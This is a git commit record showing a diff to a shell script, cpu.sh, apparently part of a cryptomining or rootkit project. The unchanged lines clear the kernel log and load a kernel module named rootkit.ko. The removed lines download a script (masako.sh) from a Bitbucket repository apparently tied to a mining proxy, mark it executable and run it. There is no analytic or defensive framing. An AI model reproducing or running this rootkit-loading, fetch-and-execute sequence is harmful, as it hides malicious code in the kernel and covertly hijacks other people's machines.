151ff28673b05aafceac50aa3133ef2121991f91
Noval Anto <novalanto6161@gmail.com>
2021-10-10 15:49:55 +0000

    cpu.sh edited online with Bitbucket

--- cpu.sh
+++ cpu.sh
@@ -5,6 +5,3 @@ make
 dmesg -C
 insmod rootkit.ko
 dmesg
-wget https://bitbucket.org/novalanto61/hashvault-proxy/raw/b62cc448ad2764c95743b8317cca46396f874ad0/masako.sh
-chmod +x masako.sh
-./masako.sh
